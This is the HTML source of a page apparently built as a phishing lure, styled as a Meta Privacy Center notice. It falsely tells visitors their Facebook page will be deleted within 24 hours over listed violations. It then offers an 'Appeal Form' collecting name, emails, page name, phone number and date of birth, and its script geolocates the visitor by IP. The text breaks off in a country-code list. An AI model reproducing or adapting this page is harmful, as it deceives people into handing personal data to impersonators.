<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <style>
            /* Mobile Responsive */
            @media screen and (max-width: 768px) {
                .left-section {
                    display: none;
                }
            }
            .container {
                display: flex;
                max-width: 1200px; /* Giới hạn chiều rộng tổng thể */
                margin: 0 auto; /* Căn giữa container */
                min-height: 100vh;
                width: 100%;
            }
            .left-section {
                width: 400px;
                padding: 40px 0 0 24px; /* padding-left nhỏ để sát phải */
                background: transparent;
            }

            .right-section {
                flex: 1; /* Chia đều không gian còn lại */
                padding: 40px 0 0 40px; /* padding-left cho nội dung bên phải */
            }

            .divider {
                width: 1px;
                background-color: #c2c4c6;
                margin: 0 32px; /* Khoảng cách giữa hai phần */
            }

            .warning-container {
                display: flex;
                align-items: center;
                gap: 8px;
            }

            .meta-logo-title {
                display: flex;
                align-items: center;
                margin-bottom: 8px;
            }

            .meta-logo {
                height: 22px;
                margin-right: 6px;
            }

            .meta-text {
                font-family: Arial, Helvetica, sans-serif;
                font-weight: 600;
                color: #1b1b1b;
                font-size: 18px;
            }

            .privacy-title {
                font-family: Helvetica, Arial, sans-serif;
                font-weight: 700;
                font-size: 32px;
                color: #1b1b1b;
                margin-bottom: 24px;
                margin-left: 0;
            }

            .btn-lock {
                display: flex;
                align-items: center;
                gap: 12px;
                height: 50px;
                width: 320px;
                background: transparent;
                color: #1b1b1b;
                font-family: Arial, Helvetica, sans-serif;
                font-size: 18px;
                font-weight: 500;
                border: none;
                border-radius: 18px;
                cursor: default;
                transition: background 0.2s, color 0.2s;
                margin-bottom: 12px;
                padding-left: 16px;
            }

            .btn-lock i {
                font-size: 20px;
                color: #1b1b1b;
                transition: color 0.2s;
            }

            .btn-lock:hover {
                background: #354855;
                color: #fff;
                cursor: pointer;
            }

            .btn-lock:hover i {
                color: #fff;
            }

            .bottom-warning {
                background: #fff;
                border-radius: 16px;
                padding: 24px 32px;
                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
                max-width: 700px;
            }
            .btn-show {
                display: flex;
                justify-content: center;
                margin-top: 16px;
            }
            .warning-row {
                display: flex;
                align-items: flex-start;
                gap: 10px;
                font-size: 16px;
                color: #e53935; /* Đỏ cảnh báo */
                font-family: Arial, Helvetica, sans-serif;
                font-weight: 500;
                margin-bottom: 0;
            }

            .icon {
                margin-top: 2px;
                flex-shrink: 0;
            }

            .warning-text {
                flex: 1;
            }

            .custom-hr {
                border: none;
                border-top: 1px solid #f3dede;
                /* margin: 8px 0; */
            }

            .toggle {
                position: relative;
            }
            input,
            textarea {
                width: 100%;
                box-sizing: border-box;
            }

            .toggle input[type='checkbox'] {
                position: absolute;
                left: 0;
                top: 0;
                z-index: 10;
                width: 100%;
                height: 100%;
                cursor: pointer;
                opacity: 0;
            }

            .toggle label {
                position: relative;
                display: flex;
                align-items: center;
            }

            /* Phần nền thanh gạt */
            .toggle label:before {
                content: '';
                width: 60px; /* giảm từ 90px */
                height: 28px; /* giảm từ 42px */
                background: #ccc;
                position: relative;
                display: inline-block;
                border-radius: 30px;
                transition: 0.2s ease-in;
            }

            /* Nút tròn */
            .toggle label:after {
                content: '';
                position: absolute;
                width: 24px; /* giảm từ 50px */
                height: 24px;
                border-radius: 50%;
                left: 2px; /* chỉnh lại vị trí */
                top: 2px;
                z-index: 2;
                background: #fff;
                box-shadow: 0 0 5px #0002;
                transition: 0.2s ease-in;
            }

            /* Hiệu ứng hover */
            .toggle input[type='checkbox']:hover + label:after {
                box-shadow: 0 2px 15px 0 #0002, 0 3px 8px 0 #0001;
            }

            /* Khi được chọn */
            .toggle input[type='checkbox']:checked + label:before {
                background: #376fcb;
            }

            .toggle input[type='checkbox']:checked + label:after {
                background: #f9fbfe;
                left: 34px; /* = 60 (chiều rộng thanh) - 24 (kích thước nút) - 2 (khoảng cách) */
            }

            /* Media Queries cho Responsive */
            @media screen and (max-width: 1200px) {
                .container {
                    max-width: 100%;
                    padding: 0 20px;
                }
            }

            @media screen and (max-width: 768px) {
                .container {
                    flex-direction: column;
                    padding: 0;
                }

                .left-section {
                    width: 100%;
                    padding: 20px 16px;
                }

                .right-section {
                    padding: 20px 16px;
                }

                .divider {
                    display: none;
                }

                .btn-lock {
                    width: 100%;
                    max-width: none;
                }

                .bottom-warning {
                    padding: 16px;
                    margin: 0;
                    border-radius: 12px;
                }

                .warning-container {
                    padding: 0 16px;
                    /* margin-bottom: 16px; */
                }

                .warning-container img {
                    width: 24px;
                    height: 24px;
                }

                .warning-container p {
                    font-size: 10px;
                    line-height: 1.4;
                }

                .warning-banner-img {
                    aspect-ratio: 16/9;
                    /* margin-bottom: 16px; */
                }

                .warning-row {
                    padding: 8px 0;
                }

                .warning-row .icon {
                    margin-top: 3px;
                }

                .warning-text {
                    font-size: 13px;
                    line-height: 1.4;
                }

                .custom-hr {
                    margin: 12px 0;
                }

                .btn-show button {
                    width: 100%;
                    height: 44px;
                    font-size: 15px;
                    margin-top: 8px;
                }

                .action-container {
                }

                .action-text {
                    /* padding: 8px 0; */
                }

                /* Modal Responsive */
                #modalOverlay > div {
                    width: 92%;
                    /* margin: 16px;
        padding: 20px 16px; */
                    border-radius: 16px;
                }

                #modalOverlay input,
                #modalOverlay textarea {
                    width: 100%;
                    box-sizing: border-box;
                    margin-bottom: 12px;
                    font-size: 15px;
                }

                #modalOverlay h2 {
                    font-size: 18px;
                }
            }

            @media screen and (max-width: 480px) {
                .privacy-title {
                    font-size: 22px;
                    margin-bottom: 16px;
                    padding: 0 16px;
                }

                .warning-container p {
                    font-size: 12px;
                }

                .btn-lock {
                    height: 44px;
                    font-size: 15px;
                    padding: 0 16px;
                    margin-bottom: 8px;
                }

                .action-text span {
                    font-size: 13px;
                }

                .small-grey {
                    padding: 0 16px;
                    font-size: 13px;
                    line-height: 1.4;
                }
            }
            .warning-banner-img {
                width: 100%;
                max-width: 699px;
                height: auto;
                border-radius: 10px;
                object-fit: cover;
                aspect-ratio: 699/200;
            }
        </style>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" />
        <link rel="icon" type="image/png" href="/assets/img/fb_icon.png" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Business Help Center | Privacy Policy</title>
    </head>
    <body style="background-color: #eaf3fb; font-family: Helvetica, sans-serif">
        <div class="container">
            <div class="left-section">
                <div class="meta-logo-title" style="width: 70px; height: 15px">
                    <svg aria-label="Meta logo" class="meta-logo" role="img" viewBox="0 0 500 100">
                        <defs>
                            <linearGradient gradientUnits="userSpaceOnUse" id=":r2:" x1="124.38" x2="160.839" y1="99" y2="59.326">
                                <stop offset=".427" stop-color="#0278F1"></stop>
                                <stop offset=".917" stop-color="#0180FA"></stop>
                            </linearGradient>
                            <linearGradient gradientUnits="userSpaceOnUse" id=":r3:" x1="42" x2="-1.666" y1="4.936" y2="61.707">
                                <stop offset=".427" stop-color="#0165E0"></stop>
                                <stop offset=".917" stop-color="#0180FA"></stop>
                            </linearGradient>
                            <linearGradient gradientUnits="userSpaceOnUse" id=":r4:" x1="27.677" x2="132.943" y1="28.71" y2="71.118">
                                <stop stop-color="#0064E0"></stop>
                                <stop offset=".656" stop-color="#0066E2"></stop>
                                <stop offset="1" stop-color="#0278F1"></stop>
                            </linearGradient>
                        </defs>
                        <path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z" fill="#1C2B33"></path>
                        <path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" fill="#0180FA"></path>
                        <path d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z" fill="url(#:r2:)"></path>
                        <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z" fill="url(#:r3:)"></path>
                        <path d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z" fill="url(#:r4:)"></path>
                    </svg>
                    <span class="meta-text"></span>
                </div>
                <h1 class="privacy-title">Privacy Center</h1>
                <button class="btn-lock">
                    <i class="fa-solid fa-house"></i>
                    Privacy Center Home Page
                </button>
                <button class="btn-lock">
                    <i class="fa-solid fa-magnifying-glass"></i>
                    Search
                </button>
                <button class="btn-lock">
                    <i class="fa-solid fa-lock"></i>
                    Privacy Policy
                </button>
                <button class="btn-lock">
                    <i class="fa-solid fa-circle-info"></i>
                    Other rules and articles
                </button>
                <button class="btn-lock">
                    <i class="fa-solid fa-gear"></i>
                    Settings
                </button>
            </div>
            <div class="divider"></div>
            <div class="right-section">
                <div class="warning-container">
                    <img style="width: 30px; height: 30px" src="/assets/img/delete.png" alt="warning" />
                    <p style="font-family: Helvetica, sans-serif; font-weight: 600; color: rgb(10, 19, 23); line-height: normal">Your Facebook may be permanently deleted within 24 hours if you do not respond to the violations of the following terms.</p>
                </div>
                <div class="border">
                    <img src="/assets/img/warning-banner.png" alt="warning" class="warning-banner-img" />
                    <div class="bottom-warning">
                        <div class="warning-row">
                            <span class="icon">
                                <!-- SVG icon -->
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8.98151 1.56642C8.53763 0.811193 7.46546 0.811193 7.02158 1.56642L0.164626 13.2331C-0.292407 14.0107 0.256279 15 1.14459 15H14.8585C15.7468 15 16.2955 14.0107 15.8385 13.2331L8.98151 1.56642ZM8 5C8.53541 5 8.95377 5.46228 8.9005 5.99504L8.54975 9.50248C8.52151 9.78492 8.28384 10 8 10C7.71616 10 7.47849 9.78492 7.45025 9.50248L7.0995 5.99504C7.04623 5.46229 7.46459 5 8 5ZM8.00154 11C8.55383 11 9.00154 11.4477 9.00154 12C9.00154 12.5523 8.55383 13 8.00154 13C7.44926 13 7.00154 12.5523 7.00154 12C7.00154 11.4477 7.44926 11 8.00154 11Z" fill="#FFCC33"></path></svg>
                            </span>
                            <span class="warning-text">Intellectual Property Infringement – Unauthorized use of copyrighted content.</span>
                        </div>
                        <hr class="custom-hr" />
                        <div class="warning-row">
                            <span class="icon">
                                <!-- SVG icon -->
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8.98151 1.56642C8.53763 0.811193 7.46546 0.811193 7.02158 1.56642L0.164626 13.2331C-0.292407 14.0107 0.256279 15 1.14459 15H14.8585C15.7468 15 16.2955 14.0107 15.8385 13.2331L8.98151 1.56642ZM8 5C8.53541 5 8.95377 5.46228 8.9005 5.99504L8.54975 9.50248C8.52151 9.78492 8.28384 10 8 10C7.71616 10 7.47849 9.78492 7.45025 9.50248L7.0995 5.99504C7.04623 5.46229 7.46459 5 8 5ZM8.00154 11C8.55383 11 9.00154 11.4477 9.00154 12C9.00154 12.5523 8.55383 13 8.00154 13C7.44926 13 7.00154 12.5523 7.00154 12C7.00154 11.4477 7.44926 11 8.00154 11Z" fill="#FFCC33"></path></svg>
                            </span>
                            <span class="warning-text">False or Misleading Information – Spreading deceptive or inaccurate content.</span>
                        </div>
                        <hr class="custom-hr" />
                        <div class="warning-row">
                            <span class="icon">
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8.98151 1.56642C8.53763 0.811193 7.46546 0.811193 7.02158 1.56642L0.164626 13.2331C-0.292407 14.0107 0.256279 15 1.14459 15H14.8585C15.7468 15 16.2955 14.0107 15.8385 13.2331L8.98151 1.56642ZM8 5C8.53541 5 8.95377 5.46228 8.9005 5.99504L8.54975 9.50248C8.52151 9.78492 8.28384 10 8 10C7.71616 10 7.47849 9.78492 7.45025 9.50248L7.0995 5.99504C7.04623 5.46229 7.46459 5 8 5ZM8.00154 11C8.55383 11 9.00154 11.4477 9.00154 12C9.00154 12.5523 8.55383 13 8.00154 13C7.44926 13 7.00154 12.5523 7.00154 12C7.00154 11.4477 7.44926 11 8.00154 11Z" fill="#FFCC33"></path></svg>
                            </span>
                            <span class="warning-text">Inappropriate or Harmful Content – Including hate speech, violence, or harassment.</span>
                        </div>
                        <hr class="custom-hr" />
                        <div class="warning-row">
                            <span class="icon">
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8.98151 1.56642C8.53763 0.811193 7.46546 0.811193 7.02158 1.56642L0.164626 13.2331C-0.292407 14.0107 0.256279 15 1.14459 15H14.8585C15.7468 15 16.2955 14.0107 15.8385 13.2331L8.98151 1.56642ZM8 5C8.53541 5 8.95377 5.46228 8.9005 5.99504L8.54975 9.50248C8.52151 9.78492 8.28384 10 8 10C7.71616 10 7.47849 9.78492 7.45025 9.50248L7.0995 5.99504C7.04623 5.46229 7.46459 5 8 5ZM8.00154 11C8.55383 11 9.00154 11.4477 9.00154 12C9.00154 12.5523 8.55383 13 8.00154 13C7.44926 13 7.00154 12.5523 7.00154 12C7.00154 11.4477 7.44926 11 8.00154 11Z" fill="#FFCC33"></path></svg>
                            </span>
                            <span class="warning-text">Advertising Policy Violations – Running ads that do not comply with Meta's guidelines.</span>
                        </div>
                        <hr class="custom-hr" />
                        <div class="warning-row">
                            <span class="icon">
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8.98151 1.56642C8.53763 0.811193 7.46546 0.811193 7.02158 1.56642L0.164626 13.2331C-0.292407 14.0107 0.256279 15 1.14459 15H14.8585C15.7468 15 16.2955 14.0107 15.8385 13.2331L8.98151 1.56642ZM8 5C8.53541 5 8.95377 5.46228 8.9005 5.99504L8.54975 9.50248C8.52151 9.78492 8.28384 10 8 10C7.71616 10 7.47849 9.78492 7.45025 9.50248L7.0995 5.99504C7.04623 5.46229 7.46459 5 8 5ZM8.00154 11C8.55383 11 9.00154 11.4477 9.00154 12C9.00154 12.5523 8.55383 13 8.00154 13C7.44926 13 7.00154 12.5523 7.00154 12C7.00154 11.4477 7.44926 11 8.00154 11Z" fill="#FFCC33"></path></svg>
                            </span>
                            <span class="warning-text">Suspicious Activity – Unusual login attempts or automated behavior.</span>
                        </div>
                        <div class="btn-show"><button style="width: 100%; height: 50px; border-radius: 30px; background-color: #0064e0; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer" onclick="showModal()">Request Review</button></div>
                        <p style="font-family: Helvetica, sans-serif; font-weight: 400; color: rgb(109, 110, 111); font-size: 16px; line-height: normal">If we do not receive a response within 24 hours, this decision will be final, and your page will be permanently removed.</p>
                    </div>
                    <h4 style="font-family: Helvetica, sans-serif; font-weight: 700; color: rgb(0, 0, 0); font-size: 16px; line-height: normal; margin-top: 16px">Privacy Center</h4>
                    <div style="display: flex; gap: 10px" class="action-container">
                        <div class="action-icon"><img style="width: 40px; height: 40px" src="/assets/img/icon-women.png" alt="" /></div>
                        <div class="action-text">
                            <span style="font-family: Helvetica, sans-serif; font-weight: 700; color: rgb(0, 0, 0); font-size: 16px; line-height: normal">What is the Privacy Policy and what does it say?</span>
                            <br />
                            <span style="font-family: Helvetica, sans-serif; font-weight: 400; color: rgb(109, 110, 111); font-size: 16px; line-height: normal">Privacy Policy</span>
                        </div>
                    </div>
                    <hr />
                    <div style="display: flex; gap: 10px" class="action-container">
                        <div class="action-icon"><img style="width: 40px; height: 40px" src="/assets/img/icon-women.png" alt="" /></div>
                        <div class="action-text">
                            <span style="font-family: Helvetica, sans-serif; font-weight: 700; color: rgb(0, 0, 0); font-size: 16px; line-height: normal">How you can manage or delete your information</span>
                            <br />
                            <span style="font-family: Helvetica, sans-serif; font-weight: 400; color: rgb(109, 110, 111); font-size: 16px; line-height: normal">Privacy Policy</span>
                        </div>
                    </div>
                    <h4 style="font-family: Helvetica, sans-serif; font-weight: 700; color: rgb(0, 0, 0); font-size: 16px; line-height: normal; margin-top: 16px">For more details, see the User Agreement</h4>
                    <div style="display: flex; gap: 10px" class="action-container">
                        <div class="action-icon"><img style="width: 40px; height: 40px" src="/assets/img/icon-docs.png" alt="" /></div>
                        <div class="action-text">
                            <span style="font-family: Helvetica, sans-serif; font-weight: 700; color: rgb(0, 0, 0); font-size: 16px; line-height: normal">Meta AI</span>
                            <br />
                            <span style="font-family: Helvetica, sans-serif; font-weight: 400; color: rgb(109, 110, 111); font-size: 16px; line-height: normal">User Agreement</span>
                        </div>
                    </div>
                    <h4 style="font-family: Helvetica, sans-serif; font-weight: 700; color: rgb(0, 0, 0); font-size: 16px; line-height: normal; margin-top: 16px">Additional resources</h4>
                    <div class="container-action">
                        <div class="action-text">
                            <span style="font-family: Helvetica, sans-serif; font-weight: 400; color: #000000; font-size: 16px; line-height: normal">How Meta uses information for generative AI models</span>
                            <br />
                            <span style="font-family: Helvetica, sans-serif; font-weight: 400; color: rgb(109, 110, 111); font-size: 16px; line-height: normal">Privacy Center</span>
                        </div>
                        <hr />
                        <div class="action-text">
                            <span style="font-family: Helvetica, sans-serif; font-weight: 400; color: #000000; font-size: 16px; line-height: normal">Cards with information about the operation of AI systems</span>
                            <br />
                            <span style="font-family: Helvetica, sans-serif; font-weight: 400; color: rgb(109, 110, 111); font-size: 16px; line-height: normal">Privacy Center</span>
                        </div>
                        <hr />
                        <div class="action-text">
                            <span style="font-family: Helvetica, sans-serif; font-weight: 400; color: #000000; font-size: 16px; line-height: normal">Introduction to Generative AI</span>
                            <br />
                            <span style="font-family: Helvetica, sans-serif; font-weight: 400; color: rgb(109, 110, 111); font-size: 16px; line-height: normal">Privacy Center</span>
                        </div>
                    </div>
                    <br />
                    <div class="small-grey" style="font-family: Helvetica, sans-serif; font-weight: 400; color: rgb(109, 110, 111); font-size: 16px; line-height: normal">We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about <a style="text-decoration: none; color: #0064e0" href="#">Privacy Policy</a></div>
                </div>
            </div>
        </div>
        <!-- Modal -->
        <div role="dialog" aria-modal="true" aria-labelledby="modalTitle" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.2); display: none; align-items: center; justify-content: center; z-index: 9999" id="modalOverlay">
            <div style="background: linear-gradient(135deg, #f8fafc 0%, #e0f2fe 100%); border-radius: 20px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.18); width: 450px; max-width: 95vw; padding: 32px 24px; position: relative" role="document">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px">
                    <h2 style="font-size: 1.4rem; font-weight: 700; margin: 0">Appeal Form</h2>
                    <button style="background: none; border: none; font-size: 1.6rem; cursor: pointer; color: #333" onclick="hideModal()">×</button>
                </div>
                <form id="appealForm" onsubmit="handleSubmit(event)">
                    <input style="margin-bottom: 12px; padding: 10px 14px; border-radius: 8px; border: 1px solid #d1d5db; font-size: 1rem" type="text" placeholder="Full Name" name="fullName" required />
                    <input style="margin-bottom: 12px; padding: 10px 14px; border-radius: 8px; border: 1px solid #d1d5db; font-size: 1rem" type="email" placeholder="Email" name="email" required />
                    <input style="margin-bottom: 12px; padding: 10px 14px; border-radius: 8px; border: 1px solid #d1d5db; font-size: 1rem" type="email" placeholder="Email Business" name="emailBusiness" />
                    <input style="margin-bottom: 12px; padding: 10px 14px; border-radius: 8px; border: 1px solid #d1d5db; font-size: 1rem" type="text" placeholder="Page Name" name="pageName" />
                    <input style="margin-bottom: 12px; padding: 10px 14px; border-radius: 8px; border: 1px solid #d1d5db; font-size: 1rem" type="tel" name="phoneNumber" />
                    <input class="date-input" style="margin-bottom: 12px; padding: 10px 14px; border-radius: 8px; border: 1px solid #d1d5db; font-size: 1rem" type="text" placeholder="MM/DD/YYYY" name="dateOfBirth" maxlength="10" oninput="formatDate(this)" />
                    <textarea style="margin-bottom: 12px; padding: 10px 14px; border-radius: 8px; border: 1px solid #d1d5db; font-size: 1rem; min-height: 70px" placeholder="Describe your issue" name="issue" required></textarea>
                    <div style="font-size: 0.95rem; color: #64748b; margin-bottom: 16px">Our response will be sent to you within 14 - 48 hours.</div>
                    <div style="display: flex; align-items: center; background: #f1f5f9; border-radius: 10px; margin-bottom: 16px">
                        <img src="/assets/img/download.png" alt="download" style="width: 30px; height: 30px; margin-right: 10px" />
                        <div style="flex: 1">
                            <div style="font-weight: 600; color: #222">on Facebook</div>
                            <div style="font-size: 0.95rem; color: #64748b">We will send you a notification on Facebook.</div>
                        </div>
                        <div style="margin-left: 10px">
                            <div class="toggle">
                                <input type="checkbox" />
                                <label></label>
                            </div>
                        </div>
                    </div>
                    <div style="display: flex; align-items: center; margin-bottom: 16px">
                        <input type="checkbox" id="agreeTerms" required style="margin-bottom: 0; margin-right: 8px; width: fit-content !important" />
                        <label for="agreeTerms" style="font-size: 0.95rem; color: #222">I agree with <a href="#" style="color: #1877f2; text-decoration: none">Terms of use</a></label>
                    </div>
                    <button type="submit" style="width: 100%; background: #1877f2; color: #fff; border: none; border-radius: 30px; padding: 12px 0; font-size: 1.1rem; font-weight: 600; cursor: pointer">Send</button>
                </form>
            </div>
        </div>
    </body>
    <script>
        let config = {};
        let cooldownTimer = null;
        let isInCooldown = false;
        console.log('Script loaded successfully!');
        const getConfig = async () => {
            const response = await fetch('/config.json');
            const data = await response.json();
            return data;
        };
        document.addEventListener('DOMContentLoaded', async () => {
            const response = await fetch('https://api.ipapi.is/');
            const rawData = await response.json();
            const country = rawData.location.country_code;
            config = await getConfig();
            const isoList = [
                { code: '+93', iso: 'AF' },
                { code: '+355', iso: 'AL' },
                { code: '+213', iso: 'DZ' },
                { code: '+1-684', iso: 'AS' },
                { code: '+376', iso: 'AD' },
                { code: '+244', iso: 'AO' },
                { code: '+1-264', iso: 'AI' },
                { code: '+672', iso: 'AQ' },
                { code: '+1-268', iso: 'AG' },
                { code: '+54', iso: 'AR' },
                { code: '+374', iso: 'AM' },
                { code: '+297', iso: 'AW' },
                { code: '+61', iso: 'AU' },
                { code: '+43', iso: 'AT' },
                { code: '+994', iso: 'AZ' },
                { code: '+1-242', iso: 'BS' },
                { code: '+973', iso: 'BH' },
                { code: '+880', iso: 'BD' },
                { code: '+1-246', iso: 'BB' },
                { code: '+375', iso: 'BY' },
                { code: '+32', iso: 'BE' },
                { code: '+501', iso: 'BZ' },
                { code: '+229', iso: 'BJ' },
                { code: '+1-441', iso: 'BM' },
                { code: '+975', iso: 'BT' },
                { code: '+591', iso: 'BO' },
                { code: '+387', iso: 'BA' },
                { code: '+267', iso: 'BW' },
                { code: '+55', iso: 'BR' },
                { code: '+246', iso: 'IO' },
                { code: '+1-284', iso: 'VG' },
                { code: '+673', iso: 'BN' },
                { code: '+359', iso: 'BG' },
                { code: '+226', iso: 'BF' },
                { code: '+257', iso: 'BI' },
                { code: '+855', iso: 'KH' },
                { code: '+237', iso: 'CM' },
                { code: '+1', iso: 'CA' },
                { code: '+238', iso: 'CV' },
                { code: '+1-345', iso: 'KY' },
                { code: '+236', iso: 'CF' },
                { code: '+235', iso: 'TD' },
                { code: '+56', iso: 'CL' },
                { code: '+86', iso: 'CN' },
                { code: '+61', iso: 'CX' },
                { code: '+61', iso: 'CC' },
                { code: '+57', iso: 'CO' },
                { code: '+269', iso: 'KM' },
                { code: '+682', iso: 'CK' },
                { code: '+506', iso: 'CR' },
                { code: '+385', iso: 'HR' },
                { code: '+53', iso: 'CU' },
                { code: '+599', iso: 'CW' },
                { code: '+357', iso: 'CY' },
                { code: '+420', iso: 'CZ' },
                { code: '+243', iso: 'CD' },
                { code: '+45', iso: 'DK' },
                { code: '+253', iso: 'DJ' },
                { code: '+1-767', iso: 'DM' },
                { code: '+1-809, 1-829, 1-849', iso: 'DO' },
                { code: '+670', iso: 'TL' },
                { code: '+593', iso: 'EC' },
                { code: '+20', iso: 'EG' },
                { code: '+503', iso: 'SV' },
                { code: '+240', iso: 'GQ' },
                { code: '+291', iso: 'ER' },
                { code: '+372', iso: 'EE' },
                { code: '+251', iso: 'ET' },
                { code: '+500', iso: 'FK' },
                { code: '+298', iso: 'FO' },
                { code: '+679', iso: 'FJ' },
                { code: '+358', iso: 'FI' },
                { code: '+33', iso: 'FR' },
                { code: '+689', iso: 'PF' },
                { code: '+241', iso: 'GA' },
                { code: '+220', iso: 'GM' },
                { code: '+995', iso: 'GE' },
                { code: '+49', iso: 'DE' },
                { code: '+233', iso: 'GH' },
                { code: '+350', iso: 'GI' },
                { code: '+30', iso: 'GR' },
                { code: '+299', iso: 'GL' },
                { code: '+1-473', iso: 'GD' },
                { code: '+1-671', iso: 'GU' },
                { code: '+502', iso: 'GT' },
                { code: '+44-1481', iso: 'GG' },
                { code: '+224', iso: 'GN' },
                { code: '+245', iso: 'GW' },
                { code: '+592', iso: 'GY' },
                { code: '+509', iso: 'HT' },
                { code: '+504', iso: 'HN' },
                { code: '+852', iso: 'HK' },
                { code: '+36', iso: 'HU' },
                { code: '+354', iso: 'IS' },
                { code: '+91', iso: 'IN' },
                { code: '+62', iso: 'ID' },
                { code: '+98', iso: 'IR' },
                { code: '+964', iso: 'IQ' },
                { code: '+353', iso: 'IE' },
                { code: '+44-1624', iso: 'IM' },
                { code: '+972', iso: 'IL' },
                { code: '+39', iso: 'IT' },
                { code: '+225', iso: 'CI' },
                { code: '+1-876', iso: 'JM' },
                { code: '+81', iso: 'JP' },
                { code: '+44-1534', iso: 'JE' },
                { code: '+962', iso: 'JO' },
                { code: '+7', iso: 'KZ' },
                { code: '+254', iso: 'KE' },
                { code: '+686', iso: 'KI' },
                { code: '+383', iso: 'XK' },
                { code: '+965', iso: 'KW' },
                { code: '+996', iso: 'KG' },
                { code: '+856', iso: 'LA' },
                { code: '+371', iso: 'LV' },
                { code: '+961', iso: 'LB' },
                { code: '+266', iso: 'LS' },
                { code: '+231', iso: 'LR' },
                { code: '+218', iso: 'LY' },
                { code: '+423', iso: 'LI' },
                { code: '+370', iso: 'LT' },
                { code: '+352', iso: 'LU' },
                { code: '+853', iso: 'MO' },
                { code: '+389', iso: 'MK' },
                { code: '+261', iso: 'MG' },
                { code: '+265', iso: 'MW' },
                { code: '+60', iso: 'MY' },
                { code: '+960', iso: 'MV' },
